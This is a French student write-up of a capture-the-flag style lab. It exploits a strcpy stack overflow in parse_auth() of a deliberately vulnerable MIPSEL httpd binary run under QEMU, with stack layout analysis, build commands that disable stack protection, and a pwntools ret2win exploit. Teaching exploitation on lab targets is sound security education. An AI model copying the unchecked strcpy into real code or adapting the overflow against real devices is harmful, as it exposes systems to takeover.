# Write-up — Lab 23 : MIPS httpd parse_auth() Stack Overflow

> **Pilier 3 — Embarqué / MIPSEL · QEMU**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

![MIPS](https://img.shields.io/badge/arch-MIPSEL-purple.svg)
![BoF](https://img.shields.io/badge/vuln-stack%20overflow-red.svg)
![pwntools](https://img.shields.io/badge/tool-pwntools-orange.svg)
![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)

---

## 1. TL;DR

**Cible :** Binaire MIPSEL `httpd` extrait du firmware AngeRouter (Lab22)  
**Vulnérabilité :** `strcpy` sans vérification dans `parse_auth()` → stack overflow → contrôle de `$ra`  
**Technique :** ret2win — écraser `$ra` avec adresse de `win()`  
**OFFSET :** 68 bytes (buf[64] + frame O32 ABI)  
**Flag :** `AngeVirus{httpd_parse_auth_overflow_pwned}`

---

## 2. Contexte — lien avec Lab22

En Lab22, l'analyse du firmware AngeRouter a révélé un binaire `bin/httpd` contenant :

- Un secret hardcodé (`AngeVirus{hardcoded_in_binary}`)
- Une fonction `parse_auth()` avec un `strcpy` intentionnellement vulnérable

Lab23 exploite cette vulnérabilité : on passe de l'analyse statique (Lab22) à l'exploitation dynamique (Lab23).

---

## 3. Analyse de la vulnérabilité

### 3.1 Code source

```c
void parse_auth(const char *input) {
    char buf[64];
    strcpy(buf, input);   /* pas de vérification de taille */
}
```

`strcpy` copie jusqu'au `\0` terminal — si `input` dépasse 64 bytes, il écrase les données sur la stack au-delà de `buf`.

### 3.2 Stack frame MIPSEL O32

```bash
mipsel-linux-gnu-objdump -d target | grep -A 30 "<parse_auth>:"
```

```asm
parse_auth:
    addiu  $sp, $sp, -96    # frame = 96 bytes
    sw     $ra, 92($sp)     # $ra sauvegardé à sp+92
    sw     $gp, 16($sp)     # $gp sauvegardé à sp+16 (O32)
    ...
    # buf commence à sp+24
    # [sp+0..15]  : arg area (O32)
    # [sp+16..19] : $gp save
    # [sp+20..23] : padding
    # [sp+24..87] : buf[64]
    # [sp+88..91] : $s8 (frame pointer)
    # [sp+92..95] : $ra ← cible
```

**OFFSET = 92 − 24 = 68**

### 3.3 Confirmation cyclic

```bash
python3 -c "from pwn import *; print(cyclic(100))" | \
    qemu-mipsel -L /usr/mipsel-linux-gnu ./target
# SIGSEGV sur adresse = cyclic_find(0x6161XX) → OFFSET confirmé
```

---

## 4. Compilation

```bash
mipsel-linux-gnu-gcc -g -fno-stack-protector -o target target.c
file target
# ELF 32-bit LSB executable, MIPS, MIPS32
```

---

## 5. Exploit

```python
from pwn import *

elf = ELF('./target')
context.arch   = 'mips'
context.endian = 'little'

win_addr = elf.sym['win']
OFFSET   = 68
payload  = b'A' * OFFSET + p32(win_addr)

p = process(['qemu-mipsel', '-L', '/usr/mipsel-linux-gnu', './target'])
p.recvuntil(b'win @ ')
win_leak = int(p.recvline().strip(), 16)

p.recvuntil(b'Auth: ')
p.send(payload)

flag = p.recvline(timeout=3)
log.success(flag.decode())
p.close()
```

**Output :**
```
[*] win @ 0x004006XX
[+] >>> FLAG : AngeVirus{httpd_parse_auth_overflow_pwned} <<<
```

---

## 6. Lien Lab22 → Lab23

| Étape | Lab | Action |
|---|---|---|
| Extraction firmware | Lab22 | `binwalk -e firmware.bin` → squashfs-root/ |
| Identification vuln | Lab22 | `strings bin/httpd` → strcpy dans parse_auth() |
| Exploitation | Lab23 | OFFSET=68, `$ra` → `win()`, flag obtenu |

---

## 7. Comparaison ARM vs MIPS (même technique)

| Élément | ARM (Lab20) | MIPS (Lab21/23) |
|---|---|---|
| Registre retour | `lr` (R14) | `$ra` ($31) |
| Sauvegarde retour | `push {lr}` | `sw $ra, N($sp)` |
| OFFSET (buf 64) | 68 | 68 |
| Appel syscall | `SVC #0` | `syscall` ($v0=4011) |
| Endianness | Little (ARM32) | Little (MIPSEL) |
| Delay slot | Non | Oui (`nop` après `jr`) |

---

## 8. Progression Pilier 3

| Lab | Technique | Arch | Difficulté |
|---|---|---|---|
| Lab18 | ret2win | ARM32 | ★☆☆ |
| Lab19 | ROP system@plt | ARM32 | ★★☆ |
| Lab20 | ret2syscall SVC#0 | ARM32 | ★★★ |
| Lab21 | MIPS ret2win | MIPSEL | ★★☆ |
| Lab22 | Firmware IoT analysis | MIPSEL | ★★☆ |
| **Lab23** | **httpd parse_auth() overflow** | **MIPSEL** | **★★☆** |

---

## Résumé technique

| Élément | Valeur |
|---|---|
| Binaire | `httpd` MIPSEL 32-bit, sans stack protector |
| Vulnérabilité | `strcpy` dans `parse_auth()` |
| OFFSET | 68 bytes |
| Technique | ret2win — `$ra` → `win()` |
| QEMU | `qemu-mipsel -L /usr/mipsel-linux-gnu` |

> Screenshots : [docs/lab23_objdump.png](docs/lab23_objdump.png) · [docs/lab23_shell.png](docs/lab23_shell.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
